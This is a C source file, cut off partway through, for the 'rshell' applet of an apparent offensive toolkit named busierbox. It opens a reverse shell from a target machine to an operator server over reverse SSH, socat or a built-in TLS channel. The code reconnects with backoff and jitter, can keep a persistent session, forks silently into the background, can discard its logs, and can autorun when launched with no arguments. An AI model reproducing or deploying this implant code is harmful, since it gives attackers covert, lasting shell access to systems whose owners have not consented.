#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "applets.h"
#include "json_helpers.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#ifndef BUSIERBOX_ARTIFACT_TIER
#define BUSIERBOX_ARTIFACT_TIER "full"
#endif
#ifndef BB_BUILTIN_TLS_ENABLE
#define BB_BUILTIN_TLS_ENABLE "no"
#endif
#include "effective_config.h"

static int yes_value(const char *s)
{
    return s && (!strcmp(s, "yes") || !strcmp(s, "1") || !strcmp(s, "true") || !strcmp(s, "on"));
}

static int read_lock_pid(const char *lock_path, long *pid, char *mode, size_t modesz)
{
    FILE *fp = fopen(lock_path, "r");
    char key[64], val[128];
    *pid = -1;
    if (mode && modesz)
        mode[0] = '\0';
    if (!fp)
        return -1;
    while (fscanf(fp, "%63[^=]=%127s\n", key, val) == 2) {
        if (!strcmp(key, "pid"))
            *pid = strtol(val, NULL, 10);
        else if (!strcmp(key, "mode") && mode && modesz)
            snprintf(mode, modesz, "%s", val);
    }
    fclose(fp);
    return 0;
}

static const char *autorun_guard_path(void)
{
    const char *env = getenv("BUSIERBOX_AUTORUN_GUARD_PATH");
    return env && *env ? env : BB_AUTORUN_GUARD_PATH;
}

static void shquote_append(char *dst, size_t dstsz, const char *src)
{
    size_t used = strlen(dst);
    const char *p;
    if (used + 2 >= dstsz)
        return;
    dst[used++] = '\'';
    dst[used] = '\0';
    for (p = src ? src : ""; *p; p++) {
        if (*p == '\'') {
            if (used + 4 >= dstsz)
                break;
            memcpy(dst + used, "'\\''", 4);
            used += 4;
        } else {
            if (used + 1 >= dstsz)
                break;
            dst[used++] = *p;
        }
        dst[used] = '\0';
    }
    if (used + 1 < dstsz) {
        dst[used++] = '\'';
        dst[used] = '\0';
    }
}

static int path_exec(const char *path)
{
    return path && *path && access(path, X_OK) == 0;
}

static void append_rshell_ledger_setup(char *cmd, size_t cmdsz)
{
    char ledger[PATH_MAX];

    snprintf(ledger, sizeof(ledger), "%s/run/cleanup-ledger.jsonl", BB_RUNTIME_ROOT);
    strcat(cmd, "bbx_l=");
    shquote_append(cmd, cmdsz, ledger);
    strcat(cmd, "; bbx_ld=${bbx_l%/*}; mkdir -p \"$bbx_ld\" 2>/dev/null || true; ");
    strcat(cmd, "bbx_ledger(){ bbx_ts=$(date +%s 2>/dev/null || printf 0); ");
    strcat(cmd, "{ printf '{\"op\":\"%s\",\"path\":\"%s\",\"scope\":\"%s\",\"mode\":\"%s\",\"ts\":%s' \"$1\" \"$2\" \"$3\" \"$4\" \"$bbx_ts\"; ");
    strcat(cmd, "[ -n \"${5:-}\" ] && printf ',\"backup\":\"%s\"' \"$5\"; printf '}\\n'; } >>\"$bbx_l\" 2>/dev/null || true; }; ");
}

static void rshell_server_listener(char *out, size_t outsz, const char *transport)
{
    if (!strcmp(transport, "ssh")) {
        snprintf(out, outsz, "scripts/busierbox-server --transport ssh --ssh-port %s", BB_OPERATOR_SERVER_SSH_PORT);
    } else {
        const char *server_transport = !strcmp(BB_RSHELL_ENCRYPTION, "none") ? "plain-shell" : "tls-shell";
        snprintf(out, outsz, "scripts/busierbox-server --transport %s --shell-port %s", server_transport, BB_RSHELL_SOCAT_PORT);
    }
}

static void rshell_connect_hint(char *out, size_t outsz, const char *transport)
{
    if (!strcmp(transport, "ssh")) {
        snprintf(out, outsz, "ssh -p %s root@127.0.0.1", BB_OPERATOR_REMOTE_FORWARD_PORT);
    } else if (!strcmp(BB_RSHELL_ENCRYPTION, "none")) {
        snprintf(out, outsz, "target opens plaintext shell stream to %s:%s", BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
    } else {
        snprintf(out, outsz, "target opens encrypted shell stream to %s:%s", BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
    }
}

static void print_rshell_config_status(FILE *out, const char *transport)
{
    char target[128], server[256], hint[256];

    snprintf(target, sizeof(target), "%s:%s", BB_OPERATOR_TARGET_BIND_HOST, BB_OPERATOR_TARGET_DROPBEAR_PORT);
    rshell_server_listener(server, sizeof(server), transport);
    rshell_connect_hint(hint, sizeof(hint), transport);

    fprintf(out, "transport=%s\n", transport);
    fprintf(out, "encryption=%s\n", BB_RSHELL_ENCRYPTION);
    fprintf(out, "run_mode=%s\n", BB_RSHELL_RUN_MODE);
    fprintf(out, "session_policy=%s\n", BB_RSHELL_SESSION_POLICY);
    fprintf(out, "operator_host=%s\n", BB_OPERATOR_SERVER_HOST);
    fprintf(out, "operator_shell_port=%s\n", BB_RSHELL_SOCAT_PORT);
    fprintf(out, "operator_ssh_port=%s\n", BB_OPERATOR_SERVER_SSH_PORT);
    fprintf(out, "remote_forward_port=%s\n", BB_OPERATOR_REMOTE_FORWARD_PORT);
    fprintf(out, "target_dropbear=%s\n", target);
    fprintf(out, "authkeys_mode=%s\n", BB_RSHELL_AUTHKEYS_MODE);
    fprintf(out, "shell_provider=%s\n", BB_RSHELL_SHELL_PROVIDER);
    fprintf(out, "server_listener=%s\n", server);
    fprintf(out, "connect_hint=%s\n", hint);
    fprintf(out, "zero_arg_autorun=%s\n", !strcmp(BB_ZERO_ARG_MODE, "rshell") ? "yes" : "no");
    if (strcmp(BB_ZERO_ARG_MODE, "rshell"))
        fputs("zero_arg_note=This artifact will not initiate reverse access when run with no arguments; start explicitly with './busierbox rshell start'.\n", out);
    if (strcmp(transport, "ssh") && !strcmp(BB_RSHELL_ENCRYPTION, "none"))
        fputs("plaintext_warning=INSECURE debug-only plaintext shell transport is configured.\n", out);
}

static int parse_int_default(const char *s, int def)
{
    char *end = NULL;
    long v;
    if (!s || !*s)
        return def;
    v = strtol(s, &end, 10);
    if (!end || *end)
        return def;
    if (v > 2147483647L)
        return 2147483647;
    if (v < -2147483647L)
        return -2147483647;
    return (int)v;
}

static int retry_delay_for_attempt(int attempt)
{
    int base = parse_int_default(BB_RSHELL_RETRY_INTERVAL_SEC, 5);
    int max = parse_int_default(BB_RSHELL_RETRY_MAX_INTERVAL_SEC, 300);
    int jitter = parse_int_default(BB_RSHELL_RETRY_JITTER_PCT, 20);
    int delay = base;

    if (base < 0)
        base = 0;
    if (max < base)
        max = base;
    if (!strcmp(BB_RSHELL_RETRY_BACKOFF, "linear"))
        delay = base * (attempt + 1);
    else if (!strcmp(BB_RSHELL_RETRY_BACKOFF, "exponential")) {
        int i;
        delay = base;
        for (i = 0; i < attempt && delay < max; i++) {
            if (delay > max / 2) {
                delay = max;
                break;
            }
            delay *= 2;
        }
    }
    if (delay > max)
        delay = max;
    if (jitter > 0 && delay > 0) {
        int span = (delay * jitter) / 100;
        if (span > 0)
            delay = delay - span + (int)(time(NULL) % (unsigned int)(span * 2 + 1));
    }
    return delay;
}

static int should_retry_after_attempt(int attempt)
{
    int retry_count = parse_int_default(BB_RSHELL_RETRY_COUNT, 1);
    if (retry_count < 0)
        return 1;
    return attempt < retry_count;
}

static int should_reconnect_after_success(int reconnects)
{
    int retry_count;

    if (!strcmp(BB_RSHELL_SESSION_POLICY, "single"))
        return 0;
    if (!strcmp(BB_RSHELL_SESSION_POLICY, "persistent"))
        return 1;
    if (strcmp(BB_RSHELL_SESSION_POLICY, "reconnect"))
        return 0;
    retry_count = parse_int_default(BB_RSHELL_RETRY_COUNT, 1);
    if (retry_count < 0)
        return 1;
    return reconnects < retry_count;
}

static int valid_session_policy(void)
{
    return !strcmp(BB_RSHELL_SESSION_POLICY, "single") ||
           !strcmp(BB_RSHELL_SESSION_POLICY, "reconnect") ||
           !strcmp(BB_RSHELL_SESSION_POLICY, "persistent");
}

static const char *policy_post_success_retry_count(const char *policy)
{
    if (!strcmp(policy, "single"))
        return "0";
    if (!strcmp(policy, "persistent"))
        return "-1";
    return BB_RSHELL_RETRY_COUNT;
}

static int connection_was_established(int rc, time_t started_at, time_t ended_at)
{
    if (rc == 0)
        return 1;
    if (ended_at > started_at && ended_at - started_at >= 2)
        return 1;
    return 0;
}

static void write_rshell_runtime_status(const char *transport, const char *state,
        int initial_attempts, int reconnect_attempts, int connected_once,
        int last_exit_code, const char *last_exit_reason)
{
    const char *guard = autorun_guard_path();
    char path[PATH_MAX];
    int fd;
    time_t now = time(NULL);

    if (!yes_value(BB_AUTORUN_GUARD_ENABLE))
        return;
    bb_mkdir_p(guard, 0700);
    bb_ledger_record("mkdir", guard, "runtime", "rshell guard path");
    snprintf(path, sizeof(path), "%s/rshell.status", guard);
    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
    if (fd < 0)
        return;
    dprintf(fd,
            "state=%s\ntransport=%s\nencryption=%s\n"
            "run_mode=%s\nsession_policy=%s\n"
            "rshell_pid=%ld\nstarted_at=%ld\nupdated_at=%ld\n"
            "initial_attempts=%d\nreconnect_attempts=%d\nconnected_once=%s\n"
            "last_exit_code=%d\nlast_exit_reason=%s\n",
            state, transport, BB_RSHELL_ENCRYPTION,
            BB_RSHELL_RUN_MODE, BB_RSHELL_SESSION_POLICY,
            (long)getpid(), (long)now, (long)now,
            initial_attempts, reconnect_attempts,
            connected_once ? "yes" : "no",
            last_exit_code, last_exit_reason ? last_exit_reason : "");
    close(fd);
    bb_ledger_record("write", path, "runtime", "rshell status");
}

static int policy_reconnects_after_disconnect(const char *policy)
{
    return !strcmp(policy, "reconnect") || !strcmp(policy, "persistent");
}

static int policy_stops_after_first_success(const char *policy)
{
    return !strcmp(policy, "single");
}

static int policy_persistent_lifecycle(const char *policy)
{
    return !strcmp(policy, "persistent");
}

static int should_background_rshell(const char *transport)
{
    const char *zero_arg = getenv("BUSIERBOX_ZERO_ARG_CONTEXT");

    if (!strcmp(transport, "ssh"))
        return 0; /* SSH starts Dropbear/dbclient workers itself. */
    if (!strcmp(BB_RSHELL_RUN_MODE, "background"))
        return 1;
    if (!strcmp(BB_RSHELL_RUN_MODE, "auto") && zero_arg && !strcmp(zero_arg, "1"))
        return 1;
    return 0;
}

#define json_string_main bb_json_string

static void write_rshell_background_status(const char *transport, pid_t pid)
{
    const char *guard = autorun_guard_path();
    char path[PATH_MAX];
    int fd;
    time_t now = time(NULL);

    if (!yes_value(BB_AUTORUN_GUARD_ENABLE))
        return;
    bb_mkdir_p(guard, 0700);
    bb_ledger_record("mkdir", guard, "runtime", "rshell guard path");

    snprintf(path, sizeof(path), "%s/rshell.pid", guard);
    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
    if (fd >= 0) {
        dprintf(fd, "pid=%ld\n", (long)pid);
        close(fd);
        bb_ledger_record("write", path, "runtime", "rshell pid");
    }

    snprintf(path, sizeof(path), "%s/rshell.status", guard);
    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
    if (fd >= 0) {
        dprintf(fd,
                "state=starting\ntransport=%s\nencryption=%s\n"
                "run_mode=%s\nsession_policy=%s\nrshell_pid=%ld\nstarted_at=%ld\n",
                transport, BB_RSHELL_ENCRYPTION, BB_RSHELL_RUN_MODE,
                BB_RSHELL_SESSION_POLICY, (long)pid, (long)now);
        close(fd);
        bb_ledger_record("write", path, "runtime", "rshell status");
    }
}

static int maybe_background_rshell(const char *transport)
{
    const char *child = getenv("BUSIERBOX_RSHELL_BACKGROUND_CHILD");
    pid_t pid;

    if ((child && !strcmp(child, "1")) || !should_background_rshell(transport))
        return 0;

    pid = fork();
    if (pid < 0) {
        perror("rshell: fork");
        return -1;
    }
    if (pid > 0) {
        write_rshell_background_status(transport, pid);
        printf("rshell_background_pid=%ld\n", (long)pid);
        printf("rshell_status=starting\n");
        return 1;
    }

    setsid();
    setenv("BUSIERBOX_RSHELL_BACKGROUND_CHILD", "1", 1);
    if (!strcmp(BB_ZERO_ARG_LOG_MODE, "none")) {
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull >= 0) {
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
    } else {
        const char *guard = autorun_guard_path();
        char log_path[PATH_MAX];
        int logfd;
        bb_mkdir_p(guard, 0700);
        bb_ledger_record("mkdir", guard, "runtime", "rshell guard path");
        snprintf(log_path, sizeof(log_path), "%s/rshell.log", guard);
        logfd = open(log_path, O_CREAT | O_APPEND | O_WRONLY, 0600);
        if (logfd >= 0) {
            bb_ledger_record("write", log_path, "runtime", "rshell log");
            dup2(logfd, STDOUT_FILENO);
            dup2(logfd, STDERR_FILENO);
            close(logfd);
        }
    }
    return 0;
}

static const char *select_rshell_shell(char *buf, size_t bufsz, const char *payload)
{
    const char *provider = BB_RSHELL_SHELL_PROVIDER;
    char candidate[PATH_MAX];

    if (!strcmp(provider, "custom")) {
        snprintf(buf, bufsz, "%s", BB_RSHELL_CUSTOM_SHELL);
        return buf;
    }
    if (!strcmp(provider, "target-sh") || !strcmp(BB_RUNTIME_MODE, "core-only")) {
        snprintf(buf, bufsz, "%s", "/bin/sh");
        return buf;
    }
    if (payload && *payload) {
        if (!strcmp(provider, "payload-busybox-sh")) {
            snprintf(buf, bufsz, "%s/bin/busybox sh", payload);
            return buf;
        }
        if (!strcmp(provider, "payload-busybox-ash")) {
            snprintf(buf, bufsz, "%s/bin/busybox ash", payload);
            return buf;
        }
        if (!strcmp(provider, "payload-zsh")) {
            snprintf(buf, bufsz, "%s/bin/zsh", payload);
            return buf;
        }
        if (!strcmp(provider, "auto")) {
            snprintf(candidate, sizeof(candidate), "%s/bin/busybox", payload);
            if (path_exec(candidate)) {
                snprintf(buf, bufsz, "%s sh", candidate);
                return buf;
            }
        }
    }
    snprintf(buf, bufsz, "%s", "/bin/sh");
    return buf;
}

int applet_rshell_main(int argc, char **argv)
{
    char payload[PATH_MAX], payload_lib[PATH_MAX + 16], busybox[PATH_MAX + 16], dropbear[PATH_MAX + 16], dbclient[PATH_MAX + 16], dropbearkey[PATH_MAX + 16], socat[PATH_MAX + 16];
    char hostkey[PATH_MAX + 64], identity[PATH_MAX + 32], authkeys[PATH_MAX + 32], rootssh[PATH_MAX];
    char cmd[16384] = "";
    char shell_cmd[PATH_MAX + 16];
    const char *subcmd = "start";
    const char *transport = BB_RSHELL_TRANSPORT;
    int i;
    int rc;

    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
        puts("usage: busierbox rshell [start|status|logs|cleanup|stop|restart] [--json] [--dry-run] [--transport ssh|socat|builtin]");
        puts("Starts or manages the configured reverse access transport.");
        printf("Configured transport: %s  encryption: %s  run_mode: %s  session_policy: %s\n",
               BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION, BB_RSHELL_RUN_MODE, BB_RSHELL_SESSION_POLICY);
        printf("Shell provider: %s  retries: %s backoff=%s interval=%ss max=%ss\n",
               BB_RSHELL_SHELL_PROVIDER, BB_RSHELL_RETRY_COUNT, BB_RSHELL_RETRY_BACKOFF,
               BB_RSHELL_RETRY_INTERVAL_SEC, BB_RSHELL_RETRY_MAX_INTERVAL_SEC);
        puts("Run mode: foreground keeps the shell in the current session; background is transport-specific; auto uses transport defaults.");
#ifdef HAVE_WOLFSSL
        puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh), builtin (wolfSSL TLS shell).");
#else
        puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh).");
        puts("builtin TLS available when rebuilt with BB_BUILTIN_TLS_ENABLE=yes and wolfSSL installed.");
#endif
        return 0;
    }
    if (argc > 1 && argv[1][0] != '-')
        subcmd = argv[1];
    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--transport") && i + 1 < argc) {
            transport = argv[++i];
            bb_config_set_cli_override("BB_RSHELL_TRANSPORT", transport);
        } else if (!strncmp(argv[i], "--transport=", 12)) {
            transport = argv[i] + 12;
            bb_config_set_cli_override("BB_RSHELL_TRANSPORT", transport);
        }
    }

    if (!strcmp(subcmd, "status")) {
        const char *guard = autorun_guard_path();
        char status_path[PATH_MAX], lock_path[PATH_MAX];
        int json = 0;
        for (i = 1; i < argc; i++)
            if (!strcmp(argv[i], "--json"))
                json = 1;
        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
        if (json) {
            FILE *fp = fopen(status_path, "r");
            char line[512], key[128], val[384];
            char rshell_pid[64] = "", dropbear_pid[64] = "", dbclient_pid[64] = "", socat_pid[64] = "";
            char state[64] = "";
            char recorded_session_policy[64] = "";
            const char *effective_session_policy;
            char started_at[64] = "", last_exit_reason[256] = "";
            char initial_attempts[64] = "", reconnect_attempts[64] = "", connected_once[64] = "";
            char target_dropbear[128], server_listener[256], connect_hint[256];
            int first = 1;

            snprintf(target_dropbear, sizeof(target_dropbear), "%s:%s", BB_OPERATOR_TARGET_BIND_HOST, BB_OPERATOR_TARGET_DROPBEAR_PORT);
            rshell_server_listener(server_listener, sizeof(server_listener), transport);
            rshell_connect_hint(connect_hint, sizeof(connect_hint), transport);

            while (fp && fgets(line, sizeof(line), fp)) {
                char *eq = strchr(line, '=');
                if (!eq)
                    continue;
                *eq++ = '\0';
                line[strcspn(line, "\r\n")] = '\0';
                eq[strcspn(eq, "\r\n")] = '\0';
                if (!strcmp(line, "state"))
                    snprintf(state, sizeof(state), "%s", eq);
                else if (!strcmp(line, "rshell_pid") || !strcmp(line, "pid"))
                    snprintf(rshell_pid, sizeof(rshell_pid), "%s", eq);
                else if (!strcmp(line, "dropbear_pid"))
                    snprintf(dropbear_pid, sizeof(dropbear_pid), "%s", eq);
                else if (!strcmp(line, "dbclient_pid"))
                    snprintf(dbclient_pid, sizeof(dbclient_pid), "%s", eq);
                else if (!strcmp(line, "socat_pid"))
                    snprintf(socat_pid, sizeof(socat_pid), "%s", eq);
                else if (!strcmp(line, "session_policy"))
                    snprintf(recorded_session_policy, sizeof(recorded_session_policy), "%s", eq);
                else if (!strcmp(line, "started_at"))
                    snprintf(started_at, sizeof(started_at), "%s", eq);
                else if (!strcmp(line, "last_exit_reason"))
                    snprintf(last_exit_reason, sizeof(last_exit_reason), "%s", eq);
                else if (!strcmp(line, "initial_attempts"))
                    snprintf(initial_attempts, sizeof(initial_attempts), "%s", eq);
                else if (!strcmp(line, "reconnect_attempts"))
                    snprintf(reconnect_attempts, sizeof(reconnect_attempts), "%s", eq);
                else if (!strcmp(line, "connected_once"))
                    snprintf(connected_once, sizeof(connected_once), "%s", eq);
            }
            if (fp) {
                fclose(fp);
                fp = fopen(status_path, "r");
            }
            effective_session_policy = recorded_session_policy[0] ? recorded_session_policy : BB_RSHELL_SESSION_POLICY;
            printf("{\"schema\":1,\"state\":");
            json_string_main(stdout, fp ? (state[0] ? state : "active") : "inactive");
            printf(",\"transport\":");
            json_string_main(stdout, transport);
            printf(",\"encryption\":");
            json_string_main(stdout, BB_RSHELL_ENCRYPTION);
            printf(",\"run_mode\":");
            json_string_main(stdout, BB_RSHELL_RUN_MODE);
            printf(",\"session_policy\":");
            json_string_main(stdout, effective_session_policy);
            printf(",\"session_semantics\":{\"retry_until_first_connection\":true,\"stop_after_first_success\":%s,\"reconnect_after_disconnect\":%s,\"persistent_lifecycle\":%s,\"fresh_session_on_reconnect\":%s,\"session_resume_supported\":false}",
                   policy_stops_after_first_success(effective_session_policy) ? "true" : "false",
                   policy_reconnects_after_disconnect(effective_session_policy) ? "true" : "false",
                   policy_persistent_lifecycle(effective_session_policy) ? "true" : "false",
                   policy_reconnects_after_disconnect(effective_session_policy) ? "true" : "false");
            printf(",\"operator_host\":");
            json_string_main(stdout, BB_OPERATOR_SERVER_HOST);
            printf(",\"operator_shell_port\":");
            json_string_main(stdout, BB_RSHELL_SOCAT_PORT);
            printf(",\"operator_ssh_port\":");
            json_string_main(stdout, BB_OPERATOR_SERVER_SSH_PORT);
            printf(",\"remote_forward_port\":");
            json_string_main(stdout, BB_OPERATOR_REMOTE_FORWARD_PORT);
            printf(",\"target_dropbear\":");
            json_string_main(stdout, target_dropbear);
            printf(",\"authkeys_mode\":");
            json_string_main(stdout, BB_RSHELL_AUTHKEYS_MODE);
            printf(",\"shell_provider\":");
            json_string_main(stdout, BB_RSHELL_SHELL_PROVIDER);
            printf(",\"retry\":{\"count\":");
            json_string_main(stdout, BB_RSHELL_RETRY_COUNT);
            printf(",\"interval_sec\":");
            json_string_main(stdout, BB_RSHELL_RETRY_INTERVAL_SEC);
            printf(",\"jitter_pct\":");
            json_string_main(stdout, BB_RSHELL_RETRY_JITTER_PCT);
            printf(",\"backoff\":");
            json_string_main(stdout, BB_RSHELL_RETRY_BACKOFF);
            printf(",\"max_interval_sec\":");
            json_string_main(stdout, BB_RSHELL_RETRY_MAX_INTERVAL_SEC);
            printf(",\"pre_connect_count\":");
            json_string_main(stdout, BB_RSHELL_RETRY_COUNT);
            printf(",\"post_disconnect_count\":");
            json_string_main(stdout, policy_post_success_retry_count(effective_session_policy));
            printf("}");
            printf(",\"runtime_counters\":{\"initial_attempts\":");
            if (initial_attempts[0])
                json_string_main(stdout, initial_attempts);
            else
                printf("null");
            printf(",\"reconnect_attempts\":");
            if (reconnect_attempts[0])
                json_string_main(stdout, reconnect_attempts);
            else
                printf("null");
            printf(",\"connected_once\":");
            if (connected_once[0])
                printf("%s", !strcmp(connected_once, "yes") ? "true" : "false");
            else
                printf("null");
            printf("}");
            printf(",\"runtime_config\":");
            bb_config_print_runtime_summary_json(stdout, json_string_main);
            printf(",\"zero_arg_autorun\":%s", !strcmp(BB_ZERO_ARG_MODE, "rshell") ? "true" : "false");
            printf(",\"guard_path\":");
            json_string_main(stdout, guard);
            printf(",\"pids\":{\"rshell\":");
            if (rshell_pid[0])
                json_string_main(stdout, rshell_pid);
            else
                printf("null");
            printf(",\"dropbear\":");
            if (dropbear_pid[0])
                json_string_main(stdout, dropbear_pid);
            else
                printf("null");
            printf(",\"dbclient\":");
            if (dbclient_pid[0])
                json_string_main(stdout, dbclient_pid);
            else
                printf("null");
            printf(",\"socat\":");
            if (socat_pid[0])
                json_string_main(stdout, socat_pid);
            else
                printf("null");
            printf("},\"started_at\":");
            if (started_at[0])
                json_string_main(stdout, started_at);
            else
                printf("null");
            printf(",\"last_exit_reason\":");
            if (last_exit_reason[0])
                json_string_main(stdout, last_exit_reason);
            else
                printf("null");
            printf(",\"log_paths\":[");
            {
                char lp[PATH_MAX];
                snprintf(lp, sizeof(lp), "%s/rshell.log", guard);
                json_string_main(stdout, lp);
                snprintf(lp, sizeof(lp), "%s/dropbear.log", guard);
                printf(",");
                json_string_main(stdout, lp);
                snprintf(lp, sizeof(lp), "%s/dbclient.log", guard);
                printf(",");
                json_string_main(stdout, lp);
            }
            printf("],\"fields\":{");
            while (fp && fgets(line, sizeof(line), fp)) {
                char *eq = strchr(line, '=');
                if (!eq)
                    continue;
                *eq++ = '\0';
                line[strcspn(line, "\r\n")] = '\0';
                eq[strcspn(eq, "\r\n")] = '\0';
                snprintf(key, sizeof(key), "%s", line);
                snprintf(val, sizeof(val), "%s", eq);
                printf("%s", first ? "" : ",");
                json_string_main(stdout, key);
                printf(":");
                json_string_main(stdout, val);
                first = 0;
            }
            if (fp)
                fclose(fp);
            printf("},\"connect_hint\":");
            json_string_main(stdout, connect_hint);
            printf(",\"server_hint\":");
            json_string_main(stdout, server_listener);
            printf(",\"server_listener\":");
            json_string_main(stdout, server_listener);
            printf(",\"connect_model\":");
            json_string_main(stdout, !strcmp(transport, "ssh") ? "operator connects through reverse SSH forward" :
                             (!strcmp(BB_RSHELL_ENCRYPTION, "none") ? "target opens plaintext shell stream to server" :
                              "target opens encrypted shell stream to server"));
            if (strcmp(BB_ZERO_ARG_MODE, "rshell")) {
                printf(",\"zero_arg_note\":");
                json_string_main(stdout, "This artifact will not initiate reverse access when run with no arguments; start explicitly with './busierbox rshell start'.");
            }
            if (strcmp(transport, "ssh") && !strcmp(BB_RSHELL_ENCRYPTION, "none")) {
                printf(",\"plaintext_warning\":");
                json_string_main(stdout, "INSECURE debug-only plaintext shell transport is configured.");
            }
            printf("}\n");
            return 0;
        }
        if (access(status_path, R_OK) == 0) {
            char buf[512];
            FILE *fp = fopen(status_path, "r");
            while (fp && fgets(buf, sizeof(buf), fp))
                fputs(buf, stdout);
            if (fp)
                fclose(fp);
            print_rshell_config_status(stdout, transport);
            return 0;
        }
        if (access(lock_path, R_OK) == 0) {
            puts("rshell_status=possibly-active");
            printf("rshell_guard=%s\n", guard);
            print_rshell_config_status(stdout, transport);
            return 0;
        }
        puts("rshell_status=inactive");
        printf("rshell_guard=%s\n", guard);
        print_rshell_config_status(stdout, transport);
        return 0;
    }
    if (!strcmp(subcmd, "logs")) {
        const char *guard = autorun_guard_path();
        static const char *names[] = {"rshell.log", "dropbear.log", "dbclient.log", NULL};
        int k;
        for (k = 0; names[k]; k++) {
            char path[PATH_MAX], buf[512];
            FILE *fp;
            snprintf(path, sizeof(path), "%s/%s", guard, names[k]);
            printf("==> %s <==\n", path);
            fp = fopen(path, "r");
            if (!fp) {
                printf("(missing; zero_arg_log_mode=%s may suppress logs)\n", BB_ZERO_ARG_LOG_MODE);
                continue;
            }
            while (fgets(buf, sizeof(buf), fp))
                fputs(buf, stdout);
            fclose(fp);
        }
        return 0;
    }
    if (!strcmp(subcmd, "cleanup")) {
        int dry_run = 0, external = 0, apply = 0;
        const char *guard = autorun_guard_path();
        char *stop_argv[] = {"rshell", "stop", NULL};
        for (i = 1; i < argc; i++) {
            if (!strcmp(argv[i], "--dry-run"))
                dry_run = 1;
            else if (!strcmp(argv[i], "--external"))
                external = 1;
            else if (!strcmp(argv[i], "--apply"))
                apply = 1;
        }
        if (dry_run) {
            printf("Would stop rshell processes and remove:\n  %s/rshell.pid\n  %s/rshell.status\n  %s/rshell.log\n", guard, guard, guard);
            if (!external)
                puts("External rshell changes are not removed without --external --apply.");
            return 0;
        }
        if (external && !apply) {
            fputs("rshell cleanup: external cleanup requires --external --apply\n", stderr);
            return 2;
        }
        rc = applet_rshell_main(2, stop_argv);
        if (rc != 0)
            return rc;
        if (external && apply && bb_clean_external_from_ledger() != 0)
            return 1;
        return 0;
    }
    if (!strcmp(subcmd, "stop") || !strcmp(subcmd, "restart")) {
        const char *guard = autorun_guard_path();
        char pid_path[PATH_MAX], lock_path[PATH_MAX], status_path[PATH_MAX];
        static const char *pid_files[] = {
            "dropbear.pid", "dbclient.pid", "socat.pid", "rshell.pid", NULL
        };
        int k;
        for (k = 0; pid_files[k]; k++) {
            long pid = -1;
            char dummy[8] = "";
            snprintf(pid_path, sizeof(pid_path), "%s/%s", guard, pid_files[k]);
            if (read_lock_pid(pid_path, &pid, dummy, sizeof(dummy)) == 0 && pid > 1) {
                if (!strcmp(pid_files[k], "rshell.pid")) {
                    if (kill((pid_t)(-pid), 0) == 0 || errno != ESRCH)
                        kill((pid_t)(-pid), SIGTERM);
                } else if (kill((pid_t)pid, 0) == 0 || errno != ESRCH) {
                    kill((pid_t)pid, SIGTERM);
                }
            }
            unlink(pid_path);
        }
        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
        snprintf(pid_path, sizeof(pid_path), "%s/autorun.lock", guard);
        unlink(lock_path);
        unlink(status_path);
        unlink(pid_path);
        if (!strcmp(subcmd, "stop")) {
            puts("rshell_stopped=yes");
            return 0;
        }
        subcmd = "start";
    }
    if (strcmp(subcmd, "start")) {
        fprintf(stderr, "rshell: unknown subcommand '%s'\n", subcmd);
        return 2;
    }

    /* Accept old transport names for backward compat */
    if (!strcmp(transport, "builtin-tls"))
        transport = "builtin";
    if (!strcmp(transport, "socat-tls"))
        transport = "socat";

    if (strcmp(transport, "ssh") && strcmp(transport, "socat") && strcmp(transport, "builtin") && strcmp(transport, "none")) {
        fprintf(stderr, "rshell: unsupported transport '%s' (supported: ssh, socat, builtin)\n", transport);
        return 2;
    }
    if (!valid_session_policy()) {
        fprintf(stderr, "rshell: unsupported session policy '%s' (supported: single, reconnect, persistent)\n", BB_RSHELL_SESSION_POLICY);
        return 2;
    }
    if (!strcmp(transport, "none")) {
        fputs("rshell: reverse shell is disabled in this build (BB_RSHELL_TRANSPORT=none)\n", stderr);
        return 1;
    }
    rc = maybe_background_rshell(transport);
    if (rc != 0)
        return rc < 0 ? 1 : 0;

    if (!strcmp(transport, "builtin")) {
#ifdef HAVE_WOLFSSL
        if (!strcmp(BB_RSHELL_ENCRYPTION, "tls") || !strcmp(BB_BUILTIN_TLS_ENABLE, "yes")) {
            int initial_attempt = 0;
            int reconnect_attempt = 0;
            int connected_once = 0;
            select_rshell_shell(shell_cmd, sizeof(shell_cmd), NULL);
            for (;;) {
                time_t started_at, ended_at;
                write_rshell_runtime_status(transport,
                    connected_once ? "reconnecting" : "connecting",
                    initial_attempt + 1, reconnect_attempt, connected_once,
                    -1, connected_once ? "post-disconnect-retry" : "pre-connect-retry");
                started_at = time(NULL);
                rc = rshell_builtin_tls(BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT, shell_cmd);
                ended_at = time(NULL);
                if (connection_was_established(rc, started_at, ended_at))
                    connected_once = 1;
                write_rshell_runtime_status(transport, connected_once ? "disconnected" : "connect-failed",
                    initial_attempt + 1, reconnect_attempt, connected_once,
                    rc, connected_once ? "session-disconnected" : "connect-failed");
                if (!connected_once) {
                    if (!should_retry_after_attempt(initial_attempt)) {
                        write_rshell_runtime_status(transport, "exited",
                            initial_attempt + 1, reconnect_attempt, connected_once,
                            rc, "initial-retry-limit");
                        return rc;
                    }
                    sleep((unsigned int)retry_delay_for_attempt(initial_attempt));
                    initial_attempt++;
                    continue;
                }
